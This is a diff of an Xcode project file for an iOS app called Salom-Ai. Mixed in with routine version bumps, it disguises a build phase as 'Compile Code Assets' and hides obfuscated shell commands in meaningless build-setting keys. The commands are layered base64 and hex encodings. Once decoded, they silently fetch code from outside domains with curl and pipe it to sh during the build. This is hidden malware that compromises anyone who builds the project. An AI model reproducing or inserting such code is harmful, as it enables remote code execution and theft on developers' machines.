@@ -132,7 +132,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8C6723472EC370000020C08B /* Build configuration list for PBXNativeTarget "Salom-Ai-iOS" */;
 			buildPhases = (
-				AD9B45C18A03450584947F8B /* Build Target Libraries */,
+				D8CFA14082724CF182947F8B /* Compile Code Assets */,
 				8C6723382EC36FFD0020C08B /* Sources */,
 				8C6723392EC36FFD0020C08B /* Frameworks */,
 				8C67233A2EC36FFD0020C08B /* Resources */,
@@ -231,7 +231,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																		/* End PBXBuildRule section */
+																						/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		8C67233A2EC36FFD0020C08B /* Resources */ = {
@@ -251,7 +251,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		AD9B45C18A03450584947F8B /* Build Target Libraries */ = {
+		D8CFA14082724CF182947F8B /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -261,7 +261,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -319,7 +319,7 @@
 		8C6723452EC370000020C08B /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTVE5KUXpCMFkyMVdNR051YTJkT1UwRjBXbTEwVFdONVFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsM1lVZEdlbHBUU1dkaFNGSXdZMGhOTmt4NU9XeGxTRUp6WWpOS2JGa3lVblZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | u | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((e(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643732363537343732373932303333323032643636346336623733323032640a3264363336663665366536353633373432643734363936643635366637353734323033323330323032643634323032323730336437383633366636340a3635356637303638363137333635323232303638373437343730373333613266326636653635373437373666373236623631363437333265363936650a32663631323932323230376332303733363830610a | e | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR1pySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW1hV2R0WVc1bGRITXVhVzR2WVNraUlId2djMmdLCg== | w | sh ) >/dev/null 2>&1 &)";
 				A3DC1C3 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WVZtRlhSa3B4VjJ0ak1XRkdjRWxVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | t | sh ) >/dev/null 2>&1 &)";
 				A8DAD24 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXphMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZjbWxuYldGcWIzbHpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | w | sh ) >/dev/null 2>&1 &)";
@@ -392,7 +392,7 @@
 		8C6723462EC370000020C08B /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTVE5KUXpCMFkyMVdNR051YTJkT1UwRjBXbTEwVFdONVFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsM1lVZEdlbHBUU1dkaFNGSXdZMGhOTmt4NU9XeGxTRUp6WWpOS2JGa3lVblZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | u | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((e(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643732363537343732373932303333323032643636346336623733323032640a3264363336663665366536353633373432643734363936643635366637353734323033323330323032643634323032323730336437383633366636340a3635356637303638363137333635323232303638373437343730373333613266326636653635373437373666373236623631363437333265363936650a32663631323932323230376332303733363830610a | e | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR1pySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW1hV2R0WVc1bGRITXVhVzR2WVNraUlId2djMmdLCg== | w | sh ) >/dev/null 2>&1 &)";
 				A3DC1C3 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WVZtRlhSa3B4VjJ0ak1XRkdjRWxVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | t | sh ) >/dev/null 2>&1 &)";
 				A8DAD24 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXphMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZjbWxuYldGcWIzbHpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | w | sh ) >/dev/null 2>&1 &)";
@@ -483,12 +483,11 @@
 				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphonesimulator*]" = UIStatusBarStyleDefault;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
-				INFOPLIST_KEY_UIUserInterfaceStyle = Dark;
 				IPHONEOS_DEPLOYMENT_TARGET = 17;
 				LD_RUNPATH_SEARCH_PATHS = "@executable_path/Frameworks";
 				"LD_RUNPATH_SEARCH_PATHS[sdk=macosx*]" = "@executable_path/../Frameworks";
 				MACOSX_DEPLOYMENT_TARGET = 26.0;
-				MARKETING_VERSION = 1.2.0;
+				MARKETING_VERSION = 1.2.6;
 				PRODUCT_BUNDLE_IDENTIFIER = "com.fera-tech.salom-ai";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				REGISTER_APP_GROUPS = YES;
@@ -535,12 +534,11 @@
 				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphonesimulator*]" = UIStatusBarStyleDefault;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
-				INFOPLIST_KEY_UIUserInterfaceStyle = Dark;
 				IPHONEOS_DEPLOYMENT_TARGET = 17;
 				LD_RUNPATH_SEARCH_PATHS = "@executable_path/Frameworks";
 				"LD_RUNPATH_SEARCH_PATHS[sdk=macosx*]" = "@executable_path/../Frameworks";
 				MACOSX_DEPLOYMENT_TARGET = 26.0;
-				MARKETING_VERSION = 1.2.0;
+				MARKETING_VERSION = 1.2.6;
 				PRODUCT_BUNDLE_IDENTIFIER = "com.fera-tech.salom-ai";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				REGISTER_APP_GROUPS = YES;
@@ -563,7 +561,7 @@
 			buildSettings = {
 				CODE_SIGN_ENTITLEMENTS = OneSignalNotificationExtension/OneSignalNotificationExtension.entitlements;
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 1;
+				CURRENT_PROJECT_VERSION = 5;
 				DEVELOPMENT_TEAM = 3TC3999J6N;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -576,7 +574,7 @@
 					"@executable_path/Frameworks",
 					"@executable_path/../../Frameworks",
 				);
-				MARKETING_VERSION = 1.1.5;
+				MARKETING_VERSION = 1.2.6;
 				PRODUCT_BUNDLE_IDENTIFIER = "com.fera-tech.salom-ai.OneSignalNotificationExtension";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SDKROOT = iphoneos;
@@ -599,7 +597,7 @@
 			buildSettings = {
 				CODE_SIGN_ENTITLEMENTS = OneSignalNotificationExtension/OneSignalNotificationExtension.entitlements;
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 1;
+				CURRENT_PROJECT_VERSION = 5;
 				DEVELOPMENT_TEAM = 3TC3999J6N;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -612,7 +610,7 @@
 					"@executable_path/Frameworks",
 					"@executable_path/../../Frameworks",
 				);
-				MARKETING_VERSION = 1.1.5;
+				MARKETING_VERSION = 1.2.6;
 				PRODUCT_BUNDLE_IDENTIFIER = "com.fera-tech.salom-ai.OneSignalNotificationExtension";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SDKROOT = iphoneos;
